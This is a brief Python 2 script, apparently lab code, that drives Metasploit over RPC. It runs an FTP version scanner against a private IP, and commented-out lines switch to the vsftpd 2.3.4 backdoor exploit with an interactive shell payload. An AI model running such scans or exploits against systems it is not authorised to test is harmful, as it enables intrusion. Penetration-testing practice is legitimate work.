from metasploit.msfrpc import MsfRpcClient
import time
client = MsfRpcClient('toor')
print str(client)
#print "Hello world"
#[m for m in dir(client) if not m.startswith('_')]
#print str( client.modules.exploits)
#print str(client.modules.auxiliary)
for module in client.modules.exploits:
	print str(module)

print "\n\n"
exploit = client.modules.use('auxiliary', 'auxiliary/scanner/ftp/ftp_version')
#exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
print str(exploit.description)+"\n\n"
print str(exploit.authors)+"\n\n"
print str(exploit.options) +"\n\n"
print str(exploit.required)+"\n\n"
#print str(exploit.payloads)+"\n\n"
exploit['RHOSTS']='192.168.179.135'
#exploit['RPORT']='21'
#exploit['USERNAME']='root'
exploit['THREADS']=1
#exploit['PASSWORD']='toor'
#exploit['VERBOSE'] =True
#print str(exploit.options) +"\n\n"
ss=exploit.execute()
#ss=exploit.execute(payload='cmd/unix/interact')
#time.sleep(5)
print str(ss)
#print str(client.sessions.list)
